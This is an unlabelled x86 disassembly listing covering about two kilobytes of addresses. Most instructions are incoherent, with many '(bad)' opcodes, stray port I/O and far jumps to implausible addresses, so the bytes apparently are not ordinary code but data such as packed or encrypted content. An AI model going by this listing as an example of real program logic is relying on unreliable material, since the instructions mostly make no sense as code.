  41067c:	rol    BYTE PTR [eax+ebp*8],cl
  41067f:	out    0xdc,eax
  410681:	cmp    eax,0xc5be59a6
  410686:	or     BYTE PTR [ebx+0x6d],bh
  410689:	popa   
  41068a:	mov    al,0x7f
  41068c:	sub    DWORD PTR [eax+edx*8-0x33],ecx
  410690:	iret   
  410691:	push   ss
  410692:	(bad)  
  410693:	jge    0x4106a2
  410695:	call   DWORD PTR [ebp-0x74]
  410698:	rcr    BYTE PTR [eax-0x5a],0x19
  41069c:	xchg   esp,eax
  41069d:	sub    al,BYTE PTR [ecx+0x4a]
  4106a0:	call   0xd15e:0x577bac5f
  4106a7:	clc    
  4106a8:	mov    ecx,0xc76c75c
  4106ad:	ss xchg esp,eax
  4106af:	dec    ebp
  4106b0:	inc    edx
  4106b1:	nop
  4106b2:	xor    edi,DWORD PTR [edx+eax*2]
  4106b5:	and    ah,BYTE PTR [edi+0x5b]
  4106b8:	repnz sub eax,0xc76e89c4
  4106be:	pop    ebx
  4106bf:	sbb    DWORD PTR [esi-0x5b202ff7],0x57
  4106c6:	dec    edx
  4106c7:	in     al,0x87
  4106c9:	scas   al,BYTE PTR es:[edi]
  4106ca:	pusha  
  4106cb:	dec    esi
  4106cc:	jecxz  0x41068e
  4106ce:	dec    edi
  4106cf:	dec    esp
  4106d0:	or     eax,0xcc09d4db
  4106d5:	xor    BYTE PTR [ebx],al
  4106d7:	push   edx
  4106d8:	pop    ebx
  4106d9:	adc    eax,0xc85c9d6f
  4106de:	mov    al,ds:0xa3304b4e
  4106e3:	fisub  DWORD PTR [ebx-0x21f40cfc]
  4106e9:	or     eax,0xe29f07f7
  4106ee:	(bad)  
  4106ef:	leave  
  4106f0:	in     al,dx
  4106f1:	xor    al,BYTE PTR [ebp+edx*8+0x438a0095]
  4106f8:	cmp    eax,eax
  4106fa:	out    0x78,al
  4106fc:	sub    al,0x3c
  4106fe:	cmp    BYTE PTR [eax],ch
  410700:	sbb    eax,0x440d655f
  410705:	outs   dx,DWORD PTR ds:[esi]
  410706:	bound  eax,QWORD PTR [edi+0x21]
  410709:	jmp    0x53f7f445
  41070e:	fstp   st(2)
  410710:	jb     0x410735
  410712:	mov    ds:0x254a5c03,al
  410717:	das    
  410718:	mov    ecx,cs
  41071a:	test   al,0x23
  41071c:	adc    edi,DWORD PTR [ecx]
  41071e:	hlt    
  41071f:	mov    ds,WORD PTR [edx+0x7813e6e2]
  410725:	push   edi
  410726:	lahf   
  410727:	jnp    0x41076b
  410729:	std    
  41072a:	jmp    0x410785
  41072c:	mov    al,0xc2
  41072e:	in     eax,dx
  41072f:	xchg   DWORD PTR [ebp-0xc48a4f8],esp
  410735:	stos   DWORD PTR es:[edi],eax
  410736:	pop    ebx
  410737:	cli    
  410738:	lds    esp,FWORD PTR [esi+0x5a]
  41073b:	mov    bl,BYTE PTR [ebx+esi*4-0x29]
  41073f:	outs   dx,DWORD PTR ds:[esi]
  410740:	popf   
  410741:	scas   eax,DWORD PTR es:[edi]
  410742:	mov    eax,0xffcd8d68
  410747:	sub    eax,ecx
  410749:	sub    eax,DWORD PTR [ebp-0x4]
  41074c:	jmp    0x410c57
  410751:	retf   0xc0cd
  410754:	rcr    bl,1
  410756:	aad    0xda
  410758:	shl    DWORD PTR [ecx+0x7468dd75],1
  41075e:	jnp    0x41076f
  410760:	add    BYTE PTR [eax+0x6a787864],bl
  410766:	jl     0x4107e0
  410768:	js     0x4107ce
  41076a:	or     eax,0x14241ed2
  41076f:	clc    
  410770:	mov    ch,0x78
  410772:	push   es
  410773:	lahf   
  410774:	call   0xfc56071
  410779:	jo     0x41073d
  41077b:	inc    ebx
  41077c:	xchg   edx,eax
  41077d:	(bad)  
  41077f:	aaa    
  410780:	xchg   esp,eax
  410781:	(bad)  
  410783:	icebp  
  410784:	(bad)  
  410785:	mov    dl,0xf4
  410787:	test   eax,0xcc0fb313
  41078c:	cld    
  41078d:	inc    ecx
  41078e:	outs   dx,BYTE PTR ds:[esi]
  41078f:	sbb    ebx,esi
  410791:	push   0x4
  410793:	rcl    edx,0xa0
  410796:	mov    eax,ds:0xe547cdc3
  41079b:	arpl   WORD PTR [edx-0x1b],ax
  41079e:	cmp    DWORD PTR [eax+0x20085a5a],edx
  4107a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107a5:	pop    ss
  4107a6:	into   
  4107a7:	mov    dl,0xa0
  4107a9:	aad    0x2b
  4107ab:	inc    ebp
  4107ac:	xlat   BYTE PTR ss:[ebx]
  4107ae:	ss out dx,eax
  4107b0:	inc    edx
  4107b1:	test   eax,0xca9904cd
  4107b6:	mov    esp,0x9ea23044
  4107bb:	add    al,0xd7
  4107bd:	lock pop es
  4107bf:	retf   
  4107c0:	test   eax,0x5f065f27
  4107c5:	retf   
  4107c6:	jg     0x41083f
  4107c8:	jmp    0x6055:0x74e9d729
  4107cf:	jl     0x4107cf
  4107d1:	stos   DWORD PTR es:[edi],eax
  4107d2:	ds mov dh,0xcc
  4107d5:	shr    dl,cl
  4107d7:	jmp    0x410811
  4107d9:	cmp    al,al
  4107db:	fisub  WORD PTR [edi-0x1]
  4107de:	mov    cl,0x92
  4107e0:	sub    al,0xf3
  4107e2:	add    dh,al
  4107e4:	jns    0x4107e4
  4107e6:	mov    dh,0xce
  4107e8:	jl     0x410841
  4107ea:	test   BYTE PTR [eax],dl
  4107ec:	mov    ds:0x77bbdbe9,al
  4107f1:	fstp   TBYTE PTR [eax]
  4107f3:	cmc    
  4107f4:	inc    edx
  4107f5:	sub    bl,BYTE PTR [esi+0x1dc5f6bb]
  4107fb:	add    ebx,DWORD PTR [ecx+0x0]
  4107fe:	popf   
  4107ff:	push   0xffffff8a
  410801:	jns    0x4107bf
  410803:	jbe    0x4107b5
  410805:	lahf   
  410806:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410807:	inc    ebp
  410808:	xor    eax,DWORD PTR [ecx+0x5]
  41080b:	inc    ebx
  41080c:	(bad)  
  41080d:	in     eax,0x2
  41080f:	xor    eax,0xaa1b0389
  410814:	fwait
  410815:	int    0x11
  410817:	push   ebx
  410818:	retf   0x14e2
  41081b:	xor    eax,0x434082b4
  410820:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410821:	in     eax,dx
  410822:	sub    ah,BYTE PTR ds:0xf3915355
  410828:	je     0x410836
  41082a:	ins    DWORD PTR es:[edi],dx
  41082b:	xchg   edi,eax
  41082c:	pop    ss
  41082d:	scas   al,BYTE PTR es:[edi]
  41082e:	mov    ch,al
  410830:	and    bl,BYTE PTR [ecx+0x10]
  410833:	out    dx,al
  410834:	aam    0x3e
  410836:	add    esi,DWORD PTR [ebp+0x8e34f65]
  41083c:	mov    esi,0x6c505168
  410841:	mov    eax,ds:0x5383f887
  410846:	sub    eax,0x94cbfd3b
  41084b:	inc    esp
  41084c:	lock or edi,ebx
  41084f:	or     al,0x64
  410851:	idiv   BYTE PTR ds:0xf822f5ec
  410857:	inc    eax
  410858:	pop    ebp
  410859:	icebp  
  41085a:	ror    DWORD PTR [edx+0x62],1
  41085d:	inc    esp
  41085e:	test   al,0xe8
  410860:	inc    eax
  410861:	jns    0x410889
  410863:	add    eax,0xfe9510c9
  410868:	jne    0x410825
  41086a:	(bad)  
  41086b:	fwait
  41086c:	in     eax,0xea
  41086e:	dec    edi
  41086f:	outs   dx,BYTE PTR ds:[esi]
  410870:	sub    dl,BYTE PTR [esi-0x43]
  410873:	js     0x410803
  410875:	add    eax,0x2dff7c00
  41087a:	ins    BYTE PTR es:[edi],dx
  41087b:	(bad)  
  41087d:	jns    0x410869
  41087f:	xchg   ebp,eax
  410880:	test   eax,0x97493b4e
  410885:	jns    0x410899
  410887:	cmp    BYTE PTR [esi],ch
  410889:	aaa    
  41088a:	inc    ebp
  41088b:	std    
  41088c:	cmp    DWORD PTR [edx],edi
  41088e:	xor    al,0x5a
  410890:	lods   eax,DWORD PTR ds:[esi]
  410891:	rol    edx,0xdc
  410894:	imul   edi,DWORD PTR [ecx],0x95910ec2
  41089a:	in     al,0x34
  41089c:	popa   
  41089d:	xor    bl,BYTE PTR ds:0x6461d817
  4108a3:	data16 (bad) 
  4108a5:	imul   ecx,esi,0x5a
  4108a8:	loopne 0x410902
  4108aa:	setp   BYTE PTR [ebx]
  4108ad:	push   esp
  4108ae:	sub    BYTE PTR [esi],bl
  4108b0:	add    al,0xfd
  4108b2:	shl    DWORD PTR [esi-0x2e],1
  4108b5:	jle    0x41084f
  4108b7:	mov    ch,0xd9
  4108b9:	ins    BYTE PTR es:[edi],dx
  4108ba:	or     eax,0x97dca44c
  4108bf:	xor    al,0xea
  4108c1:	mov    ecx,0x18974e1e
  4108c6:	cwde   
  4108c7:	sub    edi,DWORD PTR [esi+0x5e3ee766]
  4108cd:	bound  esp,QWORD PTR [eax]
  4108cf:	ds adc al,0x88
  4108d2:	pop    es
  4108d3:	pop    edx
  4108d4:	adc    BYTE PTR [eax],ah
  4108d6:	xchg   esi,eax
  4108d7:	fisub  DWORD PTR [edi-0x1bc53d5f]
  4108dd:	js     0x41091d
  4108df:	dec    esp
  4108e0:	jmp    0x1188861f
  4108e5:	jl     0x4108c1
  4108e7:	neg    DWORD PTR [edi+0x4a]
  4108ea:	push   0xffffffc4
  4108ec:	inc    edi
  4108ed:	into   
  4108ee:	mov    WORD PTR [ebp+0x55e16ab8],ss
  4108f4:	mov    bl,bh
  4108f6:	enter  0x16a3,0x81
  4108fa:	les    esp,FWORD PTR [ebx]
  4108fc:	ins    DWORD PTR es:[edi],dx
  4108fd:	fisub  WORD PTR ds:0x997884cb
  410903:	add    BYTE PTR [eax+0x5a7d0298],dh
  410909:	and    dl,BYTE PTR [edi]
  41090b:	add    ecx,DWORD PTR gs:[esi]
  41090e:	pop    ebp
  41090f:	lods   al,BYTE PTR ds:[esi]
  410910:	cmp    eax,0x8d59131d
  410915:	push   ds
  410916:	push   ecx
  410917:	pusha  
  410918:	xor    ebx,0x3b
  41091b:	mov    dh,0x17
  41091d:	jp     0x410922
  41091f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410920:	shr    BYTE PTR [esi],1
  410922:	sub    BYTE PTR [eax+0xa59d5ed],bl
  410928:	push   esi
  410929:	inc    edx
  41092a:	lds    ebx,FWORD PTR [edi-0x34fbea88]
  410930:	(bad)  
  410931:	jb     0x410979
  410933:	in     eax,dx
  410934:	bnd jmp 0x50ef259c
  41093a:	aas    
  41093b:	stos   BYTE PTR es:[edi],al
  41093c:	sbb    al,0x86
  41093e:	imul   DWORD PTR [edi+eax*8-0x25]
  410942:	mov    ecx,0xad84be79
  410947:	add    ah,BYTE PTR ds:0xd7ec2f23
  41094d:	mov    bh,0xe1
  41094f:	rep ins DWORD PTR es:[edi],dx
  410951:	sub    al,0xef
  410953:	jne    0x410984
  410955:	xchg   edx,eax
  410956:	push   ecx
  410957:	addr16 dec ecx
  410959:	add    al,0x21
  41095b:	pop    esi
  41095c:	loopne 0x41090a
  41095e:	cli    
  41095f:	mov    dl,0xf8
  410961:	fs sete bl
  410965:	in     eax,0xe1
  410967:	fadd   DWORD PTR [esi+edi*2-0x1a80e64b]
  41096e:	jl     0x410918
  410970:	in     eax,dx
  410971:	mov    eax,ds:0x6aaff8e1
  410976:	dec    esi
  410977:	push   edx
  410978:	cwde   
  410979:	retf   0x10a2
  41097c:	add    al,al
  41097e:	add    ebp,ecx
  410980:	fisttp DWORD PTR [edx]
  410982:	inc    ebx
  410983:	add    al,0x85
  410985:	add    al,0x9e
  410987:	add    esi,DWORD PTR [edi]
  410989:	iret   
  41098a:	shr    BYTE PTR [edi+0x333fbd84],0x2c
  410991:	pusha  
  410992:	inc    ebx
  410993:	mov    BYTE PTR [esi+0x48e93f9e],cl
  410999:	pushf  
  41099a:	jbe    0x4109a2
  41099c:	loop   0x4109ea
  41099e:	inc    ebp
  41099f:	(bad)  
  4109a0:	retf   
  4109a1:	scas   eax,DWORD PTR es:[edi]
  4109a2:	pop    ebp
  4109a3:	loopne 0x410994
  4109a5:	sub    al,0x3a
  4109a7:	call   0xf3443745
  4109ac:	sbb    eax,0x8e0e6f76
  4109b1:	and    BYTE PTR [edx],bh
  4109b3:	adc    ch,BYTE PTR ds:0x4ee1b5c8
  4109b9:	inc    esi
  4109ba:	dec    eax
  4109bb:	xor    dl,BYTE PTR [edi]
  4109bd:	or     BYTE PTR [ecx-0x80],bl
  4109c0:	imul   edi,esp,0xf
  4109c3:	lods   al,BYTE PTR ds:[esi]
  4109c4:	sbb    esi,eax
  4109c6:	loop   0x410975
  4109c8:	adc    bl,bl
  4109ca:	lods   eax,DWORD PTR ds:[esi]
  4109cb:	iret   
  4109cc:	xchg   WORD PTR [edx+0x5f64083],bp
  4109d3:	jle    0x4109d8
  4109d5:	sub    DWORD PTR [edx-0x45],ecx
  4109d8:	xor    DWORD PTR [ebp-0x74],ecx
  4109db:	in     eax,0x89
  4109dd:	mov    bh,0x5
  4109df:	fsub   st,st(5)
  4109e1:	add    al,0xc4
  4109e3:	xchg   ebx,eax
  4109e4:	fbstp  TBYTE PTR [edx+0x7cefa142]
  4109ea:	je     0x4109ca
  4109ec:	cmp    al,dl
  4109ee:	push   ds
  4109ef:	push   edx
  4109f0:	inc    edx
  4109f1:	in     eax,dx
  4109f2:	jge    0x410a54
  4109f4:	sub    eax,0xdc872652
  4109f9:	lods   al,BYTE PTR ds:[esi]
  4109fa:	dec    eax
  4109fb:	add    bl,al
  4109fd:	jge    0x4109c2
  4109ff:	jg     0x410a5e
  410a01:	ss dec ecx
  410a03:	inc    ecx
  410a04:	jp     0x410a30
  410a06:	dec    ebp
  410a07:	outs   dx,DWORD PTR ds:[esi]
  410a08:	jle    0x41098f
  410a0a:	mov    esp,0x31a30f25
  410a0f:	std    
  410a10:	xchg   ebp,eax
  410a11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a12:	ret    0xcc5f
  410a15:	or     BYTE PTR [ecx+0x6683c68e],bh
  410a1b:	lds    edi,FWORD PTR [ecx]
  410a1d:	mov    cl,0x53
  410a1f:	mov    DWORD PTR [edx],eax
  410a21:	fiadd  DWORD PTR [eax+edx*4-0x166dad0b]
  410a28:	shl    DWORD PTR [ecx],0x74
  410a2b:	mov    ebx,0x4c19819e
  410a30:	ins    DWORD PTR es:[edi],dx
  410a31:	xor    DWORD PTR ds:0x8696d2c3,0x76
  410a38:	jnp    0x410a3e
  410a3a:	jae    0x410a0a
  410a3c:	les    esi,FWORD PTR [esi]
  410a3e:	ja     0x4109ff
  410a40:	sub    esi,eax
  410a42:	out    dx,eax
  410a43:	mov    BYTE PTR [ecx-0x6],dh
  410a46:	pop    esp
  410a47:	or     bh,bh
  410a49:	clc    
  410a4a:	sbb    BYTE PTR [edx+0x75b0214e],0xdf
  410a51:	dec    ecx
  410a52:	jo     0x410a47
  410a54:	mov    dh,0xde
  410a56:	jo     0x4109eb
  410a58:	ins    DWORD PTR es:[edi],dx
  410a59:	cmp    BYTE PTR ds:0xb7ce05db,al
  410a5f:	test   eax,0x3909d0d1
  410a64:	pop    ebx
  410a65:	jg     0x410a62
  410a67:	and    esi,DWORD PTR [eax]
  410a69:	(bad)  [edi]
  410a6b:	popa   
  410a6c:	outs   dx,DWORD PTR ds:[esi]
  410a6d:	xchg   BYTE PTR [edx],al
  410a6f:	mov    ebx,0xd7b4dd17
  410a74:	fwait
  410a75:	out    0x66,al
  410a77:	xchg   esi,eax
  410a78:	dec    ecx
  410a79:	sbb    BYTE PTR [esi-0x75],cl
  410a7c:	jo     0x410afa
  410a7e:	jns    0x410a3d
  410a80:	cli    
  410a81:	imul   esp,DWORD PTR [esi-0x3e00d788],0xffffffac
  410a88:	outs   dx,BYTE PTR ds:[esi]
  410a89:	mov    edx,0xe55fd7aa
  410a8e:	test   eax,0x284a7a29
  410a93:	fwait
  410a94:	popa   
  410a95:	mov    bh,dh
  410a97:	sti    
  410a98:	inc    ecx
  410a99:	push   ecx
  410a9a:	push   ebp
  410a9b:	or     eax,0x267b94b7
  410aa0:	mov    cl,0x79
  410aa2:	and    DWORD PTR [eax+0x1a9f7fc6],edi
  410aa8:	(bad)  
  410aa9:	add    DWORD PTR [edi+0x19],ebx
  410aac:	mov    bh,0x56
  410aae:	push   cs
  410aaf:	add    ebp,edx
  410ab1:	ja     0x410a90
  410ab3:	pop    ebx
  410ab4:	lods   eax,DWORD PTR ds:[esi]
  410ab5:	or     bh,BYTE PTR [edx-0x7d]
  410ab8:	sub    ecx,DWORD PTR ds:0xfaa773fe
  410abe:	sbb    edi,esp
  410ac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ac1:	push   0xffffffa5
  410ac3:	arpl   WORD PTR [eax+ecx*4+0x3e670ba],cx
  410aca:	aad    0xe4
  410acc:	test   BYTE PTR ds:0x9174d9ab,bh
  410ad2:	xchg   esp,eax
  410ad3:	das    
  410ad4:	int    0xc0
  410ad6:	dec    esi
  410ad7:	sub    esp,DWORD PTR [eax]
  410ad9:	fwait
  410ada:	add    al,0xc8
  410adc:	shl    BYTE PTR [ecx+0x4b],cl
  410adf:	cdq    
  410ae0:	add    DWORD PTR [esp+edi*8+0x67],ecx
  410ae4:	test   eax,0xa416f410
  410ae9:	hlt    
  410aea:	dec    esp
  410aeb:	out    dx,al
  410aec:	lea    ecx,[ecx+ebp*4+0xc]
  410af0:	fisubr DWORD PTR [ebx-0x6bf87e4d]
  410af6:	repnz mov ds:0x93443284,eax
  410afc:	popf   
  410afd:	push   esp
  410afe:	or     al,0x68
  410b00:	xchg   edi,eax
  410b01:	addr16 repz mov al,ds:0xbdef
  410b06:	das    
  410b07:	mov    ch,0x6b
  410b09:	inc    ecx
  410b0a:	sub    DWORD PTR ds:0x5c29bd79,ecx
  410b10:	xchg   edx,eax
  410b11:	cmp    al,0xfd
  410b13:	(bad)  
  410b14:	std    
  410b15:	ret    0x7b75
  410b18:	adc    eax,0x3a743ea7
  410b1d:	mov    bh,0x93
  410b1f:	jg     0x410aca
  410b21:	loopne 0x410aa9
  410b23:	sahf   
  410b24:	sar    DWORD PTR [edx],cl
  410b26:	jae    0x410b08
  410b28:	mov    ah,0x41
  410b2a:	stc    
  410b2b:	lock ret 
  410b2d:	outs   dx,DWORD PTR ds:[esi]
  410b2e:	fs mov dh,cl
  410b31:	jnp    0x410b2a
  410b33:	inc    edi
  410b34:	jmp    0xf9dc0ad9
  410b39:	xor    DWORD PTR cs:[ecx],edi
  410b3c:	push   ebx
  410b3d:	fisub  WORD PTR [edx+0x1c]
  410b40:	mov    eax,0xe1146fe5
  410b45:	sub    dh,al
  410b47:	mov    cl,BYTE PTR fs:[ebx*1-0x22284a9a]
  410b4f:	adc    eax,0xeca9e55d
  410b54:	sub    al,0x86
  410b56:	aam    0x3
  410b58:	xchg   BYTE PTR [ecx],al
  410b5a:	rol    BYTE PTR [ebp+eax*4-0x47a7ceed],cl
  410b61:	loopne 0x410aea
  410b63:	rcr    BYTE PTR [ebx+0x3e6788fd],1
  410b69:	test   BYTE PTR [ebx-0x6371b51b],dl
  410b6f:	push   cs
  410b70:	and    edi,DWORD PTR [eax+0x307cc7b5]
  410b76:	pop    es
  410b77:	adc    BYTE PTR ds:0x30741e6a,al
  410b7d:	or     esp,esi
  410b7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b80:	xchg   edi,eax
  410b81:	cmp    BYTE PTR [esi-0x48af3d37],al
  410b87:	test   eax,0x7f5fcf99
  410b8c:	ficom  WORD PTR [ecx]
  410b8e:	adc    ecx,DWORD PTR ds:0x6729727
  410b94:	adc    DWORD PTR [ebp-0x33],esi
  410b97:	bound  esp,QWORD PTR [edx-0x3a363962]
  410b9d:	loope  0x410b74
  410b9f:	imul   esi,DWORD PTR [eax],0xffffffe5
  410ba2:	and    al,0x28
  410ba4:	(bad)  
  410ba5:	jp     0x410b52
  410ba7:	lahf   
  410ba8:	sbb    BYTE PTR [ebx+edx*8],0xf9
  410bac:	dec    esi
  410bad:	nop
  410bae:	fcom   QWORD PTR [eax-0x62]
  410bb1:	stos   DWORD PTR es:[edi],eax
  410bb2:	or     BYTE PTR ds:0x58f54e78,cl
  410bb8:	cmp    eax,esi
  410bba:	and    DWORD PTR [esi+0x3d],edi
  410bbd:	int3   
  410bbe:	scas   eax,DWORD PTR es:[edi]
  410bbf:	pop    edx
  410bc0:	xchg   esi,eax
  410bc1:	fwait
  410bc2:	scas   al,BYTE PTR es:[edi]
  410bc3:	xor    eax,0xb3f9bd20
  410bc8:	jne    0x410bd3
  410bca:	adc    BYTE PTR [edx-0x5b672816],0x3e
  410bd1:	mov    dh,0x51
  410bd3:	cmp    BYTE PTR [ebp+0x71],ch
  410bd6:	xor    ebx,esp
  410bd8:	clc    
  410bd9:	stos   DWORD PTR es:[edi],eax
  410bda:	push   ebp
  410bdb:	xor    BYTE PTR [ebx-0x1fd3466a],bh
  410be1:	fistp  DWORD PTR [edx+0x1e]
  410be4:	int    0x61
  410be6:	fs ret 
  410be8:	xor    al,BYTE PTR [edx-0x1b7c80fd]
  410bee:	inc    esp
  410bef:	std    
  410bf0:	rep outs dx,BYTE PTR ds:[esi]
  410bf2:	xor    ebp,DWORD PTR [ecx+0x6dbe1948]
  410bf8:	retf   
  410bf9:	std    
  410bfa:	call   0x8a8663c3
  410bff:	sbb    al,0x4f
  410c01:	dec    ecx
  410c02:	sbb    DWORD PTR [esi-0x40dd95af],ecx
  410c08:	push   ecx
  410c09:	push   eax
  410c0a:	mov    bl,0xac
  410c0c:	sti    
  410c0d:	fnstcw WORD PTR [ebx+0x73]
  410c10:	aas    
  410c11:	lods   eax,DWORD PTR ds:[esi]
  410c12:	cli    
  410c13:	adc    eax,0xe6bcb21a
  410c18:	jp     0x410c47
  410c1a:	pop    esi
  410c1b:	clc    
  410c1c:	adc    dl,BYTE PTR ss:[ebx+0x42]
  410c20:	xchg   edi,eax
  410c21:	aas    
  410c22:	and    al,0x2b
  410c24:	(bad)  
  410c25:	adc    edx,DWORD PTR ds:0xaa05c703
  410c2b:	inc    di
  410c2d:	xlat   BYTE PTR ds:[ebx]
  410c2e:	imul   esp,eax,0xffffffec
  410c31:	mov    bl,0xa2
  410c33:	xchg   esp,eax
  410c34:	sbb    DWORD PTR [esi+0x3c],esi
  410c37:	push   edi
  410c38:	push   edi
  410c39:	push   0xffffffee
  410c3b:	or     ecx,DWORD PTR [ebx]
  410c3d:	dec    edi
  410c3e:	mov    WORD PTR [esi],gs
  410c40:	cdq    
  410c41:	push   cs
  410c42:	retf   
  410c43:	push   0x4011585a
  410c48:	in     eax,0x54
  410c4a:	mov    DWORD PTR ss:[ecx],edx
  410c4d:	xchg   DWORD PTR [ecx],eax
  410c4f:	call   0x32f9be7b
  410c54:	lods   al,BYTE PTR ds:[esi]
  410c55:	out    dx,al
  410c56:	ror    DWORD PTR [ebx-0x37fc47b3],cl
  410c5c:	mov    eax,DWORD PTR [ebp-0x4]
  410c5f:	mov    DWORD PTR [eax+0x1],ecx
  410c62:	mov    al,BYTE PTR [ebp-0x11]
  410c65:	jmp    0x411170
  410c6a:	rol    dl,0x3f
  410c6d:	ds leave 
  410c6f:	rol    ebp,0xca
  410c72:	stos   DWORD PTR es:[edi],eax
  410c73:	test   BYTE PTR [eax],cl
  410c75:	leave  
  410c76:	leave  
  410c77:	(bad)  
  410c78:	pop    ebx
  410c79:	dec    edx
  410c7a:	mov    ch,BYTE PTR [edi+0x78]
  410c7d:	js     0x410ce9
  410c7f:	jl     0x410cf9
  410c81:	js     0x410c89
  410c83:	jns    0x410c74
  410c85:	dec    edx
  410c86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c87:	pop    edi
  410c88:	in     al,0xb3
  410c8a:	sub    DWORD PTR [ecx-0x58],edi
  410c8d:	xor    eax,0xe15f58c5
  410c92:	pop    ebx
  410c93:	aas    
  410c94:	arpl   WORD PTR [edx-0x17],bx
  410c97:	lea    edi,[eax+0x2e30e80c]
  410c9d:	and    bh,bl
  410c9f:	lods   al,BYTE PTR ds:[esi]
  410ca0:	inc    esp
  410ca1:	jae    0x410ca3
  410ca3:	lods   eax,DWORD PTR ds:[esi]
  410ca4:	and    DWORD PTR [ebx+edi*1-0x3bc85605],esp
  410cab:	retf   0x1eb
  410cae:	mov    esp,0x2ad19050
  410cb3:	inc    ebx
  410cb4:	add    ah,BYTE PTR [edi+0x5f5127f2]
  410cba:	adc    eax,0x213da83b
  410cbf:	sub    eax,DWORD PTR [ecx-0x6ff150b0]
  410cc5:	xchg   edi,eax
  410cc6:	out    dx,al
  410cc7:	pushf  
  410cc8:	test   esp,eax
  410cca:	shl    esp,0xec
  410ccd:	(bad)  
  410cce:	jmp    0x7e818f45
  410cd3:	aaa    
  410cd4:	mov    dl,0xf2
  410cd6:	test   al,0x90
  410cd8:	lock xchg BYTE PTR [edx-0x17],dh
  410cdc:	call   0x21fe:0x10ae484d
  410ce3:	stc    
  410ce4:	es dec esi
  410ce6:	cs inc ebp
  410ce8:	js     0x410cf3
  410cea:	fsubr  DWORD PTR [ebp+0x16]
  410ced:	push   cs
  410cee:	int    0xf3
  410cf0:	sbb    bl,BYTE PTR [ecx]
  410cf2:	loopne 0x410d3d
  410cf4:	mov    esp,ecx
  410cf6:	pop    eax
  410cf7:	mov    ebx,esi
  410cf9:	aaa    
  410cfa:	fwait
  410cfb:	jg     0x410d0e
  410cfd:	shl    DWORD PTR [edi+ebp*2],cl
  410d00:	and    BYTE PTR [eax-0x55ad0109],cl
  410d06:	pop    eax
  410d07:	addr16 in eax,0xc6
  410d0a:	(bad)  
  410d0c:	bound  esp,QWORD PTR [edi+0x25]
  410d0f:	retf   0x9bde
  410d12:	xor    al,0xfe
  410d14:	shl    BYTE PTR [edi-0x40],1
  410d17:	dec    ebx
  410d18:	shr    bl,cl
  410d1a:	cwde   
  410d1b:	mov    cl,0xe0
  410d1d:	cld    
  410d1e:	outs   dx,DWORD PTR ds:[esi]
  410d1f:	test   BYTE PTR [ebx+ebx*4-0x4621f7c2],cl
  410d26:	mov    ds:0xaedb84e3,al
  410d2b:	test   al,0x77
  410d2d:	mov    eax,DWORD PTR [ebp+0x49]
  410d30:	cwde   
  410d31:	in     eax,0x6c
  410d33:	jb     0x410cf3
  410d35:	mov    eax,ds:0xcc23ae6d
  410d3a:	outs   dx,DWORD PTR ds:[esi]
  410d3b:	dec    edi
  410d3c:	popa   
  410d3d:	inc    ecx
  410d3e:	xchg   ecx,ebp
  410d40:	or     DWORD PTR [edx-0x4],0xffffffa9
  410d44:	cdq    
  410d45:	pusha  
  410d46:	pop    ss
  410d47:	retf   
  410d48:	xor    al,bh
  410d4a:	jmp    0xf8c21538
  410d4f:	push   ebx
  410d50:	mov    esi,ebp
  410d52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d53:	sar    BYTE PTR [ebx+0x6955ff8c],cl
  410d59:	enter  0x7672,0x96
  410d5d:	pop    es
  410d5e:	push   ebx
  410d5f:	outs   dx,DWORD PTR ds:[esi]
  410d60:	sbb    al,0x77
  410d62:	dec    eax
  410d63:	sbb    ebx,DWORD PTR [eax+0x8048064]
  410d69:	push   cs
  410d6a:	cmp    al,0x95
  410d6c:	fidivr WORD PTR [ebx]
  410d6e:	or     dh,BYTE PTR [ecx-0x13]
  410d71:	lods   eax,DWORD PTR ds:[esi]
  410d72:	outs   dx,BYTE PTR ds:[esi]
  410d73:	dec    ebp
  410d74:	adc    cl,BYTE PTR [eax-0x43d210b6]
  410d7a:	or     edx,DWORD PTR [ebx+0x35]
  410d7d:	out    0xc7,al
  410d7f:	(bad)  
  410d80:	xlat   BYTE PTR ds:[ebx]
  410d81:	or     DWORD PTR [esi-0x12],ebx
  410d84:	retf   
  410d85:	or     eax,0xc4c4e22f
  410d8a:	inc    esp
  410d8b:	sbb    ebx,ebp
  410d8d:	imul   esp,DWORD PTR [esi+0x220a9601],0x7ce80d19
  410d97:	and    DWORD PTR [edi],ebx
  410d99:	push   edi
  410d9a:	jae    0x410d87
  410d9c:	out    dx,al
  410d9d:	mov    edx,0x813706f
  410da2:	mov    eax,fs:0x251e026b
  410da8:	sub    ebp,DWORD PTR [edi+0x28]
  410dab:	fwait
  410dac:	mov    ebx,0x18b26d21
  410db1:	sub    eax,0x25caa057
  410db6:	and    ah,BYTE PTR [ecx+0x3e]
  410db9:	add    ah,BYTE PTR [edx]
  410dbb:	cmp    eax,0xaec51990
  410dc0:	and    al,0x58
  410dc2:	add    BYTE PTR [edi],dl
  410dc4:	mov    edi,0x2a0e8ec8
  410dc9:	mov    ah,0xe3
  410dcb:	mov    edx,0x8610285c
  410dd0:	mov    eax,0xa1445139
  410dd5:	push   ds
  410dd6:	and    DWORD PTR [ecx+esi*2-0x21633996],ebx
  410ddd:	sbb    bl,BYTE PTR [ebp-0x34]
  410de0:	imul   eax,DWORD PTR [esi+0xe],0xa79bcc49
  410de7:	add    edi,DWORD PTR [edx-0x6e]
  410dea:	and    eax,0x8f0034df
  410def:	mov    cl,0xb0
  410df1:	imul   edx,DWORD PTR [ebx+eax*4-0x38b18427],0x79bba568
  410dfc:	clc    
  410dfd:	scas   eax,DWORD PTR es:[edi]
  410dfe:	jno    0x410e16
  410e00:	aam    0x5a
  410e02:	add    BYTE PTR [eax],ah
  410e04:	cmp    BYTE PTR [ebx-0x6c],ch
  410e07:	bswap  ebx
  410e09:	xchg   esi,eax
  410e0a:	push   ss
  410e0b:	and    al,0x31
  410e0d:	mov    ds,eax
  410e0f:	or     dh,ah
  410e11:	mov    esp,0xa5864e28
  410e16:	(bad)  
  410e18:	test   bh,bh
  410e1a:	stos   DWORD PTR es:[edi],eax
